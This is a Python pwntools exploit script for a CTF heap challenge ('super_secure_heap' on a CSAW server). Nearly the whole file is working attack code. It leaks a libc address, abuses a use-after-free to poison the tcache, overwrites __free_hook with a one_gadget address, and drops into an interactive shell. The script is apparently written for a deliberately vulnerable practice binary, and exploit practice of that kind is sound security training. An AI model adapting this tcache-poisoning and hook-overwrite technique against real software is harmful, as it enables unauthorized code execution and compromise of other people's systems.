#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './super_secure_heap_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
host, port = 'pwn.csaw.io', 9998

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# key pointers are properly nullified upon free
# content pointers are left dangling
# key data are as it is
# content data are encrypted 
kc = {
    "keys": 1,
    "content": 2
}

def alloc(size):
    info(f'=== ALLOCATING: {list(kc.keys())[list(kc.values()).index(mode)]} ===')
    io.sendlineafter(b'>', str(mode).encode())
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'item:', str(size).encode())
    
def free(idx):
    info(f'=== FREEING: {list(kc.keys())[list(kc.values()).index(mode)]} ===')
    io.sendlineafter(b'>', str(mode).encode())
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'remove:', str(idx).encode())
    
def update(idx, size, content, key=0):
    info(f'=== UPDATING: {list(kc.keys())[list(kc.values()).index(mode)]} ===')
    io.sendlineafter(b'>', str(mode).encode())
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'modify:', str(idx).encode())
    if(mode == 2):
        io.sendlineafter(b'with:', str(key).encode())
    io.sendlineafter(b'content:', str(size).encode())
    io.sendlineafter(b'content:', content)
    
def view(idx):
    info(f'=== VIEWING: {list(kc.keys())[list(kc.values()).index(mode)]} ===')
    io.sendlineafter(b'>', str(mode).encode())
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'show:', str(idx).encode())

def exploit():
    global io
    io = initialize()
    
    global mode
    
    # leaking libc
    mode = kc['content']
    alloc(1350)     # content idx: 0
    alloc(1350)     # content idx: 1, protecting from wilderness consolidation
    free(0)
    free(1)
    
    # receiving and formatting leak
    view(0)
    io.recvuntil(b'content:')
    io.recvline()
    main_arena = u64(io.recvline()[:6].ljust(8, b'\x00'))
    libc.address = main_arena - 0x1ecbe0
    
    # trigerring UAF
    # key notes are:
    #       - write are can only be done through keys
    #       - dangling pointers can only existent in content 
    mode = kc['content']
    alloc(0x40)     # content idx: 2
    alloc(0x40)     # content idx: 3
    free(3)
    
    mode = kc['keys']
    alloc(0x40)     # key idx: 0 -> using from content 3's tcache bin
    
    mode = kc['content']
    free(2)
    free(3)
    
    mode = kc['keys']
    update(0, 0x20, p64(libc.sym['__free_hook']))
    alloc(0x40)     # keys idx: 1
    alloc(0x40)     # keys idx: 2 --> corrupted tcache poisoned --> our target addr
    
    one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
    update(2, 0x20, p64(libc.address + one_gadgets[1]))
    free(0)         # --> trigger __free_hook

    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()